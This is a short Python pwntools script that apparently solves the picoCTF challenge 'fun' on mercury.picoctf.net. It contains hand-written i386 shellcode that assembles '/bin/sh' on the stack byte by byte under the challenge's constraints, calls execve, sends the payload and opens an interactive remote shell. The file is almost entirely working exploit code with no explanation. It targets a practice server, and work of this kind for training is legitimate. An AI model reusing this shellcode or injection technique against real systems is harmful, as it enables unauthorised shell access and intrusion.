#!/usr/bin/python3

from pwn import *

exe = ELF("./fun", checksec=False)
# r = process(exe.path)
r = remote("mercury.picoctf.net", 40525)


shellcode  = asm(
	'''
	xor eax,eax
	push eax
	push eax
	mov edi,esp
	mov al,0x2f
	add byte ptr [edi],al
	inc edi
	nop
	mov al,0x62
	add byte ptr [edi],al
	inc edi
	nop
	mov al,0x69
	add byte ptr [edi],al
	inc edi
	nop
	mov al,0x6e
	add byte ptr [edi],al
	inc edi
	nop
	mov al,0x2f
	add byte ptr [edi],al
	inc edi
	nop
	mov al,0x73
	add byte ptr [edi],al
	inc edi
	nop
	mov al,0x68
	add byte ptr [edi],al
	inc edi
	nop
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov ebx,esp
	mov al,0xb
	int 0x80
	''',arch='i386'
	)
# payload = b"\x31\xC0\x50\x50\x89\xE7\xB0\x2F\x00\x07\x47\x90\xB0\x62\x00\x07\x47\x90\xB0\x69\x00\x07\x47\x90\xB0\x6E\x00\x07\x47\x90\xB0\x2F\x00\x07\x47\x90\xB0\x73\x00\x07\x47\x90\xB0\x68\x00\x07\x47\x90\x31\xDB\x31\xC9\x31\xD2\xB0\x0B\x89\xE3\xCD\x80"
payload = shellcode
r.sendafter(b'Give me code to run:\n',payload)
r.interactive()